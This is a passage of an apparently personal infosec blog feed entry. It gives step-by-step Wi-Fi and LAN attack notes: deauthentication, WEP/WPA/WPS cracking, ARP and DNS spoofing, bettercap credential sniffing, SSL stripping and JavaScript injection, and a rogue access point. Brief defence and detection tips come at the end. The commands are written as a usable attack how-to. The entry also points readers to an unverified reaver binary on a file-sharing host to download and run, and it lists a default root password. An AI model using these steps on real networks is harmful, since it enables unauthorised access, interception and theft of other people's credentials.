&lt;li&gt;&lt;code&gt;iwconfig&lt;/code&gt; for all &lt;strong&gt;wireless&lt;/strong&gt; connection states&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The MAC address (specified by manufacturer) will be listed in &lt;code&gt;ifconfig&lt;/code&gt; under &lt;code&gt;ether&lt;/code&gt;. You can alter the MAC address in memory directly by:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Disabling that adapter &lt;code&gt;ifconfig eth0 down&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Reassign a new MAC address &lt;code&gt;ifconfig eth0 hw ether 00:11:22:33:44:55&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;The MAC address will be reset upon restarting or reconnecting the device.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id="checking-wireless-networks"&gt;Checking Wireless Networks&lt;/h4&gt;
&lt;p&gt;We can seek out wireless networks using &lt;code&gt;airodump-ng&lt;/code&gt;. Ensure that your wireless access point (typically USB device) is in monitor mode with &lt;code&gt;iwconfig wlan0 mode monitor&lt;/code&gt;. Now we can listen to available networks with &lt;code&gt;airodump-ng mon0&lt;/code&gt; (where &lt;code&gt;mon0&lt;/code&gt; is the access point in monitor mode). To listen on a variety of bands (eg, 2.4GHz and 5GHz), use the command &lt;code&gt;airodump-ng --band abg mon0&lt;/code&gt;.&lt;/p&gt;
&lt;h4 id="sniffing-data-from-specific-device"&gt;Sniffing Data from Specific Device&lt;/h4&gt;
&lt;p&gt;To sniff data to a file, the command &lt;code&gt;airodump-ng --bssid [MAC] --channel [network_channel] --write [file_name] [wireless card]&lt;/code&gt;. This will sniff the data being transmitted by this device, and write it to a series of files. This data can later be analysed by programs like WireShark (because the data captured is potentially encrypted).&lt;/p&gt;
&lt;h4 id="deauthentication-attack"&gt;DeAuthentication Attack&lt;/h4&gt;
&lt;p&gt;This is a denial of service attack, but specifically for use in a Wi-Fi context. Ensuring to run &lt;code&gt;airodump-ng&lt;/code&gt; at the same time during this attack. This is achieved with &lt;code&gt;aireplay-ng&lt;/code&gt; and all that is required is to know the target MAC address (which is available in generic network sniffing (see above)).&lt;/p&gt;
&lt;p&gt;&lt;code&gt;aireplay-ng -D --deauth [#deauthPackets] -a [NetworkMAC] -c [TargetMAC] [wifi card]&lt;/code&gt;&lt;/p&gt;
&lt;h3 id="gaining-access"&gt;Gaining Access&lt;/h3&gt;
&lt;h4 id="cracking-wep"&gt;Cracking WEP&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;Capture a large amount of packets &lt;code&gt;airodump-ng --bssid [MAC] --channel [network_channel] --write [file_name] [wireless card]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;run &lt;code&gt;aircrack-ng [filename.cap]&lt;/code&gt; (leave step 1 running in the background)&lt;ul&gt;
&lt;li&gt;To connect with ascii found, copy paste and connect!&lt;/li&gt;
&lt;li&gt;TO CONNECT WITH KEY FOUND!, copy the key after the text provided in the square brackets, remove the colons [:], and copy paste that number when the Wi-Fi asks for a password.&lt;/li&gt;
&lt;li&gt;If the network is not busy and not enough packets are being sent force the network to make packets (see step 3 in &lt;a href="#fake-authentication-attack"&gt;Fake Authentication Attack&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id="fake-authentication-attack"&gt;Fake Authentication Attack&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;run &lt;code&gt;airodump-ng --bssid [MAC] --channel [network_channel] --write [file_name] [wireless card]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;run &lt;code&gt;aireplay-ng --fakeauth [number of times (0 for 1 time)] -D -a [TargetMAC] -h [YOUR_WirelessAdapter_MAC] [WirelessAdapter (wlan0) ]&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;(Note in monitor mode MAC is the first 12 digits after unspec + replace [-] with [:] )&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;make sure your associated with the network (step 2) and run &lt;code&gt;aireplay-ng --arpreplay -b [TargetMAC] -h [YOUR_WirelessAdapter_MAC] [WirelessAdapter (wlan0) ]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;then run the crack &lt;code&gt;aircrack-ng [filename.cap]&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;may want to leave all 3 running at once&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id="cracking-wpawpa2"&gt;Cracking WPA/WPA2&lt;/h3&gt;
&lt;p&gt;For cracking WPA or WPA2, look out for WPS, this will enable the hack to much simpler as WPS is an 8 digit pin. Otherwise same attack as &lt;a href="#cracking-wep"&gt;WEP&lt;/a&gt;, but will take longer as WPA/WPA2 were designed to solve WEP's problems, thus more secure.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;WPS is only available if the router supports WPS (and not PBS(push button authentication))&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id="with-wps"&gt;With WPS&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;to find all networks with WPS enabled use &lt;code&gt;wash --interface [WirelessAdapter]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;to attack a network with WPS:&lt;ol&gt;
&lt;li&gt;run fake auth on the router &lt;code&gt;aireplay-ng --fakeauth [number of times (0 for 1 time)] -D -a [TargetMAC] -h [YOUR_WirelessAdapter_MAC] [WirelessAdapter (wlan0) ]&lt;/code&gt; + leave airodump-ng in background (see WEP step 1)&lt;/li&gt;
&lt;li&gt;use reaver &lt;code&gt;reaver --bssid [targetMAC] --channel [channel] --interface [WirelessAdapter] -vvv --no-associate&lt;/code&gt;
    &amp;gt; if reaver doesn't work use this version of reaver &lt;a href="https://ufile.io/lro4nkdv"&gt;https://ufile.io/lro4nkdv&lt;/a&gt; make sure you run &lt;code&gt;chmod +x reaver&lt;/code&gt; then &lt;code&gt;./reaver [your command here]&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id="without-wps"&gt;Without WPS&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;monitor and write to a file&lt;/li&gt;
&lt;li&gt;deauthenticate a client to capture handshake&lt;/li&gt;
&lt;li&gt;create a word list:&lt;ol&gt;
&lt;li&gt;Download a word list off the internet or:&lt;ul&gt;
&lt;li&gt;Crunch can be used to create a word list using &lt;code&gt;crunch [min] [max] [characters] -t [pattern] -o [filename]&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Need handshake + word list to crack WPA&lt;/li&gt;
&lt;li&gt;to begin cracking the password use &lt;code&gt;aircrack-ng [.cap file] -w [wordlist]&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;methods to speedup&lt;ol&gt;
&lt;li&gt;use online services with handshake &amp;amp; word list&lt;/li&gt;
&lt;li&gt;use GPU for cracking&lt;/li&gt;
&lt;li&gt;use rainbow tables&lt;/li&gt;
&lt;li&gt;pipe word list as it is being created&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id="securing-your-network"&gt;Securing your Network&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Ensure WPA2 is used with a long, complex password with letters, special characters and numbers&lt;/li&gt;
&lt;li&gt;Change the password to the router login (typically admin, admin)&lt;/li&gt;
&lt;li&gt;Disable WPS&lt;/li&gt;
&lt;li&gt;Specify exact MAC addresses to connect (visitors won't like this)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="post-connection-attacks-mitm-attacks"&gt;Post Connection Attacks (MITM Attacks)&lt;/h3&gt;
&lt;h4 id="discovering-devices-on-the-network"&gt;Discovering Devices on the Network&lt;/h4&gt;
&lt;p&gt;Need to gather information (MAC, IP etc.), there are programs that do for you = NetDiscover, Nmap.&lt;/p&gt;
&lt;h5 id="netdiscover"&gt;NetDiscover&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;to use NetDiscover &lt;code&gt;netdiscover -r [ip_range (can only access IPs on the same subnet eg. 10.0.2.xx ends at 254 so eg. 10.0.2.1/24 /24 means all IPs]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;use your ip address with the last .xx being .1&lt;/li&gt;
&lt;li&gt;if using wireless card use &lt;code&gt;-i [wirelessCard]&lt;/code&gt; before &lt;code&gt;-r&lt;/code&gt; or just connect to the network.&lt;/li&gt;
&lt;li&gt;if not finding anything try (interface only if using Wi-Fi, MUST BE IN MANAGED/AUTO MODE)&lt;ul&gt;
&lt;li&gt;&lt;code&gt;netdiscover -i &amp;lt;interface&amp;gt; &amp;lt;gateway IP/8&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;netdiscover -i &amp;lt;interface&amp;gt; &amp;lt;gateway IP/16&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;netdiscover -i &amp;lt;interface&amp;gt; &amp;lt;gateway IP/24&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;To make sure of the gateway IP address, please route -n&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id="nmap"&gt;Nmap&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;Zenmap is the graphical user interface of Nmap use &lt;zenmap&gt;&lt;/zenmap&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;in the target  use your network with xx at the end eg. 10.0.2.1/24 (see above &lt;a href="#netdiscover"&gt;NetDiscover&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;in the profiles there are a number of default commands to use. (ping scan might not list everything)&lt;/li&gt;
&lt;li&gt;use info found to work out things eg. does this model router have any exploits or the phone brand is samsung meaning it's running on android&lt;/li&gt;
&lt;li&gt;Quick Scan(profile) - also shows open ports and the services running on these ports eg. if port 80 is open a webserver is running.&lt;/li&gt;
&lt;li&gt;Quick scan plus - Quick scan but also shows Operating system, device type and the programs and program versions running on the ports.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img alt="Nmap" class="img-fluid" src="https://jackmckew.dev/img/nmap.png"/&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Fun Note: when you jailbrake an iOS device it auto installs an ssh server with default password being: alpine, and uname: root, use &lt;code&gt;ssh root@[phone/server_ip]&lt;/code&gt; then enter yes and alpine&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id="arp-attack"&gt;ARP Attack&lt;/h4&gt;
&lt;p&gt;Address Resolution Protocol (ARP) allows us to link ip addresses to MAC addresses.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ARP request sends a signal to all clients on the network asking who has this XXX IP the IP will respond with it's MAC address&lt;/li&gt;
&lt;li&gt;goal is to trick the router into thinking you are the victim and the victim into thinking you are the router. (Man in the Middle)&lt;/li&gt;
&lt;li&gt;Use program ARPspoof &lt;code&gt;arpspoof -i [interface(wificard)] -t [clientip] [gatewayip]&lt;/code&gt; and then &lt;code&gt;arpspoof -i [interface(wificard)] -t [gatewayip] [clientip]&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;There is also a tool called bettercap (more features).&lt;/li&gt;
&lt;li&gt;ARPspoof is not default installed use &lt;code&gt;apt-get update &amp;amp;&amp;amp; apt-get install -y dsniff&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Packets will be blocked by default on linux to allow packets to flow though on linux use &lt;code&gt;echo 1 &amp;gt; /proc/sys/net/ipv4/ip_forward&lt;/code&gt; (echo 0 to revert)&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id="bettercap"&gt;BetterCap&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;use &lt;code&gt;bettercap -iface [interface]&lt;/code&gt; (interface must be connected to the network you wish to attack)&lt;ul&gt;
&lt;li&gt;use help to get info of modules running or help [module for more]&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;net.probe on&lt;/code&gt; gets all clients&lt;/li&gt;
&lt;li&gt;&lt;code&gt;net.show&lt;/code&gt; shows all clients&lt;/li&gt;
&lt;li&gt;To do Man in the middle in Bettercap use &lt;code&gt;help arp.spoof&lt;/code&gt; you need to modify some of the options, to do this use &lt;code&gt;set [option_name] [value]&lt;/code&gt; (set full.duplux on and set targets in .targets)&lt;/li&gt;
&lt;li&gt;once settings have been set up turn it on &lt;code&gt;arp.spoof on&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;To capture data that is being spoofed and analyse it use the net.sniff module &lt;code&gt;net.sniff on&lt;/code&gt; , you will see entered usernames and passwords under POST&lt;/li&gt;
&lt;li&gt;Instead of doing the above you can use a caplet, to capture data for you&lt;ol&gt;
&lt;li&gt;open a text file and type each command&lt;ul&gt;
&lt;li&gt;&lt;code&gt;net.probe on&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;set arp.spoof.fullduplex true&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;set arp.spoof.targets [target_ips]&lt;/code&gt; (will need to change IP in script each time you use, to target multiple IPs use the comma [,] after each IP)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;arp.spoof on&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;net.sniff on&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Save the file with .cap&lt;/li&gt;
&lt;li&gt;From Bash use &lt;code&gt;bettercap -iface [interface] -caplet [filename]&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id="https"&gt;HTTPS&lt;/h4&gt;
&lt;p&gt;HTTP is sent as plain text HTTPS adds a extra layer of security called TLS (Transport layer security) or SSL(Secure Socket Layer), they encrypt traffic being sent. Almost impossible to break, therefore easiest method is to downgrade the connection to HTTP can use a tool called &lt;code&gt;SSL Strip&lt;/code&gt;. BetterCap has a caplet for this however it does not replace all HTTPS links in the loaded pages. This won't work if the target site has implemented HSTS, this can also be bypassed but is more difficult (by tricking the browser into loading a different site). One method is to use &lt;code&gt;hstshijack&lt;/code&gt;, which a resource for this is at &lt;a href="https://github.com/bettercap/caplets/tree/master/hstshijack"&gt;https://github.com/bettercap/caplets/tree/master/hstshijack&lt;/a&gt;.&lt;/p&gt;
&lt;h4 id="dns-spoofing"&gt;DNS Spoofing&lt;/h4&gt;
&lt;p&gt;Instead of returning Google's IP return a malicious server. Kali comes installed with a webserver, to start it use &lt;code&gt;service apache2 start&lt;/code&gt; go to KALI's IP to use. The default webpage is stored in /var/www/html.&lt;/p&gt;
&lt;p&gt;To spoof:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Start bettercap with the caplet coded above&lt;/li&gt;
&lt;li&gt;Use the dns.spoof module:&lt;ol&gt;
&lt;li&gt;if you do not want to redirect to yourself change the dns.spoof.address value&lt;/li&gt;
&lt;li&gt;set dns.spoof.all so bettercap responds to any dns request &lt;code&gt;set dns.spoof.all true&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;set dns.spoof.domains to the sites you wish to be redirected to you. &lt;code&gt;set dns.spoof.domains [domain1, domain2]&lt;/code&gt; (use * as a wildcard to do any subdoamin under a website eg.*.kali.org)&lt;/li&gt;
&lt;li&gt;start dns.spoof &lt;code&gt;dns.spoof on&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id="javascript-code-injection"&gt;JavaScript Code Injection&lt;/h4&gt;
&lt;p&gt;How to insert JavaScript code:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Have JavaScript code file&lt;/li&gt;
&lt;li&gt;go to the hstshijack plugin /usr/share/bettercap/caplets&lt;/li&gt;
&lt;li&gt;go to the .cap file and add the js code under the payloads, * means all domains then : eg. *:/code.js (otherwise use a domain).&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id="wireshark"&gt;WireShark&lt;/h3&gt;
&lt;p&gt;Wireshark is the world's foremost and widely-used network protocol analyzer. Only analyses data flowing though your computer, so works with man in the middle. Go into settings and select the interface you want to start capturing (hold ctl if you want to cap multiple) in output you can send it to a cap file for later analysis. HTTPS will be encrypted so be sure to use hstshijack. Green = TCP packets, Darkblue = DNS, lightblue = UTP, BLACK = TCP with errors.&lt;/p&gt;
&lt;p&gt;Filtering packets:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;in the filters type: http&lt;/li&gt;
&lt;li&gt;Double Click to get more info. Under the Hypertext Transfer Protocol section important info is shown.&lt;/li&gt;
&lt;li&gt;can see what type next too the info&lt;/li&gt;
&lt;li&gt;right click a packet and go follow &amp;gt; http stream to see exactly what was sent.&lt;/li&gt;
&lt;li&gt;again under the double click &amp;gt; Hypertext Transfer Protocol you can see what was requested or responded.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;To find usernames and passwords check under POST requests and under the html form url encoded. ctl + f to find data, set search to packet details and set last one to string and oyu can type a name like admin etc.&lt;/p&gt;
&lt;p&gt;If you want to put BetterCap data in a file use &lt;code&gt;set net.sniff.output [file]&lt;/code&gt;&lt;/p&gt;
&lt;h3 id="creating-a-honeypot-fake-access-point"&gt;Creating a Honeypot (fake access point)&lt;/h3&gt;
&lt;p&gt;We use &lt;code&gt;hostapd-mana&lt;/code&gt; to achieve this, mana is a featureful rogue access point first presented at Defcon 22 by Dominic White &lt;a href="https://github.com/sensepost/hostapd-mana"&gt;https://github.com/sensepost/hostapd-mana&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Use Mana:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;start-noupstream.sh&lt;/code&gt; -Starts access point with no internet access&lt;/li&gt;
&lt;li&gt;&lt;code&gt;start-nat-simple.sh&lt;/code&gt; -Starts an access point with internet access (use this)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;start-nat-full.sh&lt;/code&gt; -Starts a access point and automatically starts sniffing data, bypass https&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;To install Mana on Linux:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;apt-get update&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;apt-get --yes install build-essential pkg-config git libnl-genl-3-dev libssl-dev&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cd /tmp&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;git clone https://github.com/sensepost/hostapd-mana&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cd hostapd-mana&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;make -C hostapd&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;mv /tmp/hostapd-mana/hostapd/ /usr/lib/mana-toolkit&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cd /usr/share/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;git clone --depth 1 https://github.com/sensepost/mana.git&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;mv mana mana-toolkit&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;mkdir /etc/mana-toolkit/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;mv mana-toolkit/run-mana/conf/*.conf /etc/mana-toolkit/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Editing Mana:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;edit mana settings in /etc/mana-toolkit/hostatp-mana.conf &amp;gt; check interface + SSID (Name).&lt;/li&gt;
&lt;li&gt;edit start script in /usr/share/mana-toolkit/run-mana/start-nat-simple.sh &amp;gt; check upstream interface (set to the one that has internet access), check phy (the card that is going to broadcast the network[wlan0]).&lt;/li&gt;
&lt;li&gt;start the script &lt;code&gt;bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="detection-security"&gt;Detection &amp;amp; Security&lt;/h3&gt;
&lt;h4 id="detecting-arp-attacks"&gt;Detecting ARP Attacks&lt;/h4&gt;
&lt;p&gt;On Windows use &lt;code&gt;arp -a&lt;/code&gt; if the gateway matches another MAC in the network = bad, not practical to type every time and constantly so use XARP (&lt;a href="http://www.xarp.net/"&gt;http://www.xarp.net/&lt;/a&gt;)!&lt;/p&gt;
&lt;p&gt;To discover suspicious activity on a network use wireshark. &amp;gt; go to preferances &amp;gt; protocols &amp;gt; ARP &amp;gt; enable detect arp request storms. Broadcast packets are dangerous that is the hacker detecting the network. If you go to Expert Information, you can see the storm info. Also under expert information you can see warning for arp poisoning and other things. You can use static arp tables (you must manually configure) system will refuse if arp changes. Problem if you need to connect to different networks.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;This is only detection, not prevention. There is not much we can do after detecting except exiting that network or changing access control.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id="preventing-mitm-attacks"&gt;Preventing MITM Attacks&lt;/h4&gt;
&lt;p&gt;Make sure everything is encrypted using https (Plugin to do this automatically &lt;a href="https://www.eff.org/https-everywhere"&gt;https://www.eff.org/https-everywhere&lt;/a&gt;) or use a VPN, preferably use both!.&lt;/p&gt;&lt;/body&gt;</content><category term="Software"></category><category term="software"></category><category term="infosec"></category></entry></feed>